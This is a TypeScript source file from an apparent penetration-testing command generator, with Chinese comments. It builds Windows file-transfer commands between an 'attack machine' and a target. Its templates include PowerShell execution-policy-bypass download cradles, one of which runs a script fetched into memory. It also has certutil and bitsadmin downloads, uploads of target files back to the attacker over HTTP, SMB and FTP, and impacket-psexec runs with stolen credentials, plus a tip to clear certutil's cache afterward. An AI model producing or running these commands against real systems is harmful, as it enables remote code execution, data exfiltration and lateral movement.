import type { Profile, Tool } from '../../types';
import { v } from '../../lib/auth';

/**
 * 文件传输命令生成
 * 覆盖 HTTP / SMB / BITS / FTP / certutil / PowerShell 六类通道，
 * 每类均给出 CMD 与 PowerShell 两种目标端命令。
 * 约定: 攻击机 = 本地 IP/端口，落地路径默认为 C:\Windows\Temp\<文件名>
 */

const lhost = (p: Profile): string => v(p.localIP, 'LHOST');
const lport = (p: Profile): string => v(p.localPort, 'LPORT');
const fname = (p: Profile): string => v(p.fileName, 'FILE');
/** 目标端落地完整路径 */
const rpath = (p: Profile): string =>
  p.remotePath?.trim() ? p.remotePath : `C:\\Windows\\Temp\\${v(p.fileName, 'FILE')}`;

export const filetransferTools: Tool[] = [
  {
    id: 'ft-hosting',
    name: '攻击机托管服务',
    category: 'filetransfer',
    description: '在攻击机上启动 HTTP/SMB 服务，配合下方目标端命令使用',
    commands: [
      {
        id: 'ft-host-python',
        title: 'Python HTTP 服务 (攻击机)',
        description: '在文件所在目录执行，提供 HTTP 下载',
        build: (p) => `python3 -m http.server ${lport(p)}`,
      },
      {
        id: 'ft-host-smbserver',
        title: 'Impacket SMB 服务 (攻击机)',
        description: '共享当前目录，share 名为 share',
        build: () => `impacket-smbserver share $(pwd) -smb2support`,
      },
      {
        id: 'ft-host-upload',
        title: 'HTTP 上传服务 (攻击机)',
        description: '接收 PowerShell UploadFile / certutil POST 上传',
        build: (p) => `python3 -m uploadserver ${lport(p)}`,
      },
    ],
  },
  {
    id: 'ft-http-ps',
    name: 'HTTP 传输 (PowerShell)',
    category: 'filetransfer',
    description: '通过 PowerShell 从攻击机 HTTP 服务下载/上传',
    commands: [
      {
        id: 'ft-ps-webclient-dl',
        title: 'WebClient 下载 (CMD 单行)',
        description: '兼容性最好，CMD 下直接执行',
        build: (p) => `powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://${lhost(p)}:${lport(p)}/${fname(p)}','${rpath(p)}')"`,
      },
      {
        id: 'ft-ps-iwr-dl',
        title: 'Invoke-WebRequest 下载 (CMD 单行)',
        build: (p) => `powershell -ep bypass -c "iwr -Uri http://${lhost(p)}:${lport(p)}/${fname(p)} -OutFile '${rpath(p)}'"`,
      },
      {
        id: 'ft-ps-iex',
        title: '无落地下载执行 (脚本)',
        description: '仅适用于 PowerShell 脚本，直接内存执行',
        build: (p) => `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost(p)}:${lport(p)}/${fname(p)}')"`,
      },
      {
        id: 'ft-ps-upload',
        title: 'WebClient 上传到攻击机 (CMD 单行)',
        description: '需攻击机运行 uploadserver',
        build: (p) => `powershell -ep bypass -c "(New-Object Net.WebClient).UploadFile('http://${lhost(p)}:${lport(p)}/upload','${rpath(p)}')"`,
      },
    ],
  },
  {
    id: 'ft-http-cmd',
    name: 'HTTP 传输 (CMD)',
    category: 'filetransfer',
    description: '通过 certutil / bitsadmin 等 CMD 内置工具传输',
    commands: [
      {
        id: 'ft-certutil-dl',
        title: 'certutil 下载 (CMD)',
        description: '完成后建议执行 certutil -urlcache -split -f <url> delete 清理缓存',
        build: (p) => `certutil.exe -urlcache -split -f http://${lhost(p)}:${lport(p)}/${fname(p)} "${rpath(p)}"`,
      },
      {
        id: 'ft-bitsadmin-dl',
        title: 'bitsadmin 下载 (CMD)',
        build: (p) => `bitsadmin /transfer hazama /download /priority high http://${lhost(p)}:${lport(p)}/${fname(p)} "${rpath(p)}"`,
      },
      {
        id: 'ft-bits-ps',
        title: 'Start-BitsTransfer 下载 (CMD 单行)',
        build: (p) => `powershell -ep bypass -c "Start-BitsTransfer -Source 'http://${lhost(p)}:${lport(p)}/${fname(p)}' -Destination '${rpath(p)}'"`,
      },
      {
        id: 'ft-certutil-encode',
        title: 'certutil Base64 编码 (文件内容传输)',
        description: '目标上编码后复制回攻击机解码，适用于无直连通道时通过 shell 粘贴传输',
        build: (p) => `certutil.exe -encode "${rpath(p)}" ${v(p.fileName, 'FILE')}.b64`,
      },
    ],
  },
  {
    id: 'ft-smb',
    name: 'SMB 共享传输',
    category: 'filetransfer',
    description: '配合 impacket-smbserver，走 445 端口 (内网友好)',
    commands: [
      {
        id: 'ft-smb-copy-dl',
        title: 'copy 从共享下载 (CMD)',
        build: (p) => `copy \\\\${lhost(p)}\\share\\${fname(p)} "${rpath(p)}"`,
      },
      {
        id: 'ft-smb-ps-dl',
        title: 'Copy-Item 从共享下载 (CMD 单行)',
        build: (p) => `powershell -ep bypass -c "Copy-Item '\\\\${lhost(p)}\\share\\${fname(p)}' -Destination '${rpath(p)}'"`,
      },
      {
        id: 'ft-smb-copy-ul',
        title: 'copy 上传到共享 (CMD)',
        build: (p) => `copy "${rpath(p)}" \\\\${lhost(p)}\\share\\${fname(p)}`,
      },
      {
        id: 'ft-smb-xcopy',
        title: 'xcopy 目录传输 (CMD)',
        build: (p) => `xcopy \\\\${lhost(p)}\\share\\${v(p.fileName, 'DIR')} "${p.remotePath?.trim() ? p.remotePath : `C:\\Windows\\Temp\\${v(p.fileName, 'DIR')}`}" /E /I /H`,
      },
    ],
  },
  {
    id: 'ft-ftp',
    name: 'FTP 传输',
    category: 'filetransfer',
    description: '攻击机先启动 FTP 服务 (如 pyftpdlib: python3 -m pyftpdlib -p 21 -w)',
    commands: [
      {
        id: 'ft-ftp-cmd',
        title: 'ftp 脚本下载 (CMD)',
        description: '生成脚本后用 ftp -s 非交互执行',
        build: (p) =>
          `echo open ${lhost(p)} 21>ftp.txt & echo anonymous>>ftp.txt & echo password>>ftp.txt & echo binary>>ftp.txt & echo get ${fname(p)}>>ftp.txt & echo bye>>ftp.txt & ftp -s:ftp.txt`,
      },
      {
        id: 'ft-ftp-ps',
        title: 'FTP 下载 (CMD 单行)',
        build: (p) => `powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('ftp://${lhost(p)}/${fname(p)}','${rpath(p)}')"`,
      },
      {
        id: 'ft-ftp-ps-ul',
        title: 'FTP 上传 (CMD 单行)',
        build: (p) => `powershell -ep bypass -c "(New-Object Net.WebClient).UploadFile('ftp://${lhost(p)}/${fname(p)}','${rpath(p)}')"`,
      },
    ],
  },
  {
    id: 'ft-impacket-exec',
    name: '执行器自带传输',
    category: 'filetransfer',
    description: '利用 impacket 横向移动工具自带的文件上传能力',
    commands: [
      {
        id: 'ft-psexec-c',
        title: 'psexec -c 上传执行',
        description: '复制本地文件到目标 ADMIN$ 并执行',
        build: (p) => `impacket-psexec ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')}@${v(p.targetIP || p.targetHost, 'TARGET')} -c ${fname(p)}`,
      },
      {
        id: 'ft-smbclient-put',
        title: 'smbclient put 上传',
        description: '在 impacket-smbclient 迷你 shell 内执行',
        build: (p) => `use C$\nput ${fname(p)} Windows\\Temp\\${fname(p)}`,
      },
    ],
  },
];
